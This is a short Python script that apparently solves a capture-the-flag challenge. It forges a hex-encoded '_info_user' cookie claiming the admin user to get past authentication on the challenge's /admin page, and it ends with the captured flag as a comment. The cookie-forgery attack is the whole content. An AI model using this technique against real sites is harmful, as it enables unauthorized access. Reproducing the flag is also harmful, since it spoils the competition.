import requests
from binascii import hexlify

URL = 'http://cookauth.chal.ctf.gdgalgiers.com/admin'

payload = '{"user": "admin"}'

resp = requests.get(url = URL, cookies = { '_info_user': hexlify(payload.encode()).decode() })
print(resp.text)

# CyberErudites{7H1$_WA$_T0O_wE4k_FOR_4_VAlID471on}
